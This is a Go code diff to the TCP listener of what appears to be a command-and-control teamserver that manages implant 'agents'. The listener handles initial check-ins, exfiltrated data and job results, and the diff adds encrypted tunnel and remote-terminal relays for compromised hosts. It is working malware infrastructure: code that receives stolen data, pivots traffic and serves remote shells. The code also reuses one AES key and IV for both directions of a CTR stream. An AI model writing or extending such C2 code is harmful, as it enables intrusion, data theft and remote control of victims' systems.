@@ -15,6 +15,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -54,9 +55,11 @@ type TCP struct {
 }
 
 const (
-	INIT_PACK  = 1
-	EXFIL_PACK = 2
-	JOB_PACK   = 3
+	INIT_PACK     = 1
+	EXFIL_PACK    = 2
+	JOB_PACK      = 3
+	TUNNEL_PACK   = 4
+	TERMINAL_PACK = 5
 )
 
 type StartMsg struct {
@@ -80,6 +83,24 @@ type JobPack struct {
 	Id   uint   `msgpack:"id"`
 	Type uint   `msgpack:"type"`
 	Task string `msgpack:"task"`
+}
+
+type TunnelPack struct {
+	Id        uint   `msgpack:"id"`
+	Type      uint   `msgpack:"type"`
+	ChannelId int    `msgpack:"channel_id"`
+	Key       []byte `msgpack:"key"`
+	Iv        []byte `msgpack:"iv"`
+	Alive     bool   `msgpack:"alive"`
+}
+
+type TermPack struct {
+	Id     uint   `msgpack:"id"`
+	TermId int    `msgpack:"term_id"`
+	Key    []byte `msgpack:"key"`
+	Iv     []byte `msgpack:"iv"`
+	Alive  bool   `msgpack:"alive"`
+	Status string `msgpack:"status"`
 }
 
 func (handler *TCP) Start(ts Teamserver) error {
@@ -165,7 +186,9 @@ func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {
 		goto ERR
 	}
 
-	if initMsg.Type == INIT_PACK {
+	switch initMsg.Type {
+
+	case INIT_PACK:
 
 		var initPack InitPack
 		err := msgpack.Unmarshal(initMsg.Data, &initPack)
@@ -189,7 +212,7 @@ func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {
 		handler.AgentConnects.Put(agentId, connection)
 
 		for {
-			sendData, err = ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
+			sendData, err = ModuleObject.ts.TsAgentGetHostedTasksOnly(agentId, 0x1900000)
 			if err != nil {
 				break
 			}
@@ -217,7 +240,7 @@ func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {
 		handler.AgentConnects.Delete(agentId)
 		_ = conn.Close()
 
-	} else if initMsg.Type == EXFIL_PACK {
+	case EXFIL_PACK:
 
 		var exfilPack ExfilPack
 		err := msgpack.Unmarshal(initMsg.Data, &exfilPack)
@@ -243,11 +266,10 @@ func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {
 			_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
 		}
 
-		//_ = ts.TsAgentSetMark(agentId, "Disconnect")
 		handler.JobConnects.Delete(jcId)
 		_ = conn.Close()
 
-	} else if initMsg.Type == JOB_PACK {
+	case JOB_PACK:
 
 		var jobPack JobPack
 		err := msgpack.Unmarshal(initMsg.Data, &jobPack)
@@ -273,9 +295,135 @@ func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {
 			_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
 		}
 
-		//_ = ts.TsAgentSetMark(agentId, "Disconnect")
 		handler.JobConnects.Delete(jcId)
 		_ = conn.Close()
+
+	case TUNNEL_PACK:
+
+		var tunPack TunnelPack
+		err := msgpack.Unmarshal(initMsg.Data, &tunPack)
+		if err != nil {
+			goto ERR
+		}
+
+		agentId := fmt.Sprintf("%08x", tunPack.Id)
+
+		if !ModuleObject.ts.TsTunnelChannelExists(tunPack.ChannelId) {
+			goto ERR
+		}
+
+		if !tunPack.Alive {
+			ts.TsTunnelConnectionClose(tunPack.ChannelId)
+			_ = conn.Close()
+			return
+		}
+
+		ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, true)
+
+		pr, pw, err := ModuleObject.ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
+		if err != nil {
+			goto ERR
+		}
+
+		blockEnc, _ := aes.NewCipher(tunPack.Key)
+		encStream := cipher.NewCTR(blockEnc, tunPack.Iv)
+		encWriter := &cipher.StreamWriter{S: encStream, W: conn}
+
+		blockDec, _ := aes.NewCipher(tunPack.Key)
+		decStream := cipher.NewCTR(blockDec, tunPack.Iv)
+		decWriter := &cipher.StreamWriter{S: decStream, W: pw}
+
+		var closeOnce sync.Once
+		closeAll := func() {
+			closeOnce.Do(func() {
+				_ = conn.Close()
+				_ = pr.Close()
+			})
+		}
+
+		var wg sync.WaitGroup
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			io.Copy(encWriter, pr)
+			closeAll()
+		}()
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			io.Copy(decWriter, conn)
+			closeAll()
+		}()
+
+		wg.Wait()
+
+		ts.TsTunnelConnectionClose(tunPack.ChannelId)
+
+	case TERMINAL_PACK:
+
+		var termPack TermPack
+		err := msgpack.Unmarshal(initMsg.Data, &termPack)
+		if err != nil {
+			goto ERR
+		}
+
+		agentId := fmt.Sprintf("%08x", termPack.Id)
+		terminalId := fmt.Sprintf("%08x", termPack.TermId)
+
+		if !ModuleObject.ts.TsTerminalConnExists(terminalId) {
+			goto ERR
+		}
+
+		if !termPack.Alive {
+			_ = ts.TsAgentTerminalCloseChannel(terminalId, termPack.Status)
+			_ = conn.Close()
+			return
+		}
+
+		ts.TsTerminalConnResume(agentId, terminalId)
+
+		pr, pw, err := ModuleObject.ts.TsTerminalGetPipe(agentId, terminalId)
+		if err != nil {
+			goto ERR
+		}
+
+		blockEnc, _ := aes.NewCipher(termPack.Key)
+		encStream := cipher.NewCTR(blockEnc, termPack.Iv)
+		encWriter := &cipher.StreamWriter{S: encStream, W: conn}
+
+		blockDec, _ := aes.NewCipher(termPack.Key)
+		decStream := cipher.NewCTR(blockDec, termPack.Iv)
+		decWriter := &cipher.StreamWriter{S: decStream, W: pw}
+
+		var closeOnce sync.Once
+		closeAll := func() {
+			closeOnce.Do(func() {
+				_ = conn.Close()
+				_ = pr.Close()
+			})
+		}
+
+		var wg sync.WaitGroup
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			io.Copy(encWriter, pr)
+			closeAll()
+		}()
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			io.Copy(decWriter, conn)
+			closeAll()
+		}()
+
+		wg.Wait()
+
+		_ = ts.TsAgentTerminalCloseChannel(terminalId, "killed")
 	}
 
 	return
